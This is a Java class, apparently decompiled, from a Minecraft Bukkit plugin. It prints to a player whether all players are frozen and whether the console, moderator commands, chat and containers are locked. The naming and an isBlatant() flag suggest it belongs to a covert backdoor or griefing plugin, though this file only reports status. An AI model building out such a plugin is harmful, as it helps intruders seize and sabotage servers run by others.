
package me.system.runner.command.impl;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.Settings;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;

public class StatusCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        p2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&',(String)"&8&m----------------------------------"));
        p2.sendMessage("         " + Settings.DARK_RED + Settings.NAME + " by " + Settings.AUTHOR);
        p2.sendMessage("");
        p2.sendMessage (ChatColor.translateAlternateColorCodes((char)'&',(String)"&7All players frozen: " + Settings.RED + plugin.frozen));
        p2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&',(String)"&7Console Locked: " + Settings.RED + plugin.isLocked));
        p2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&',(String)"&7Mod Commands Locked: " + Settings.RED + plugin.modCmd));
        p2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&',(String)"&7Commands Locked: " + Settings.RED + plugin.playerCommandsLocked));
        p2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&',(String)"&7Chat Locked: " + Settings.RED + plugin.chatLocked));
        p2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&',(String)"&7Containers Locked: " + Settings.RED + plugin.storagesDisabled));
        p2.sendMessage("");
        p2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&',(String)"&8&m----------------------------------"));
    }

    @Override
    public boolean isBlatant() {
        return false;
    }
}

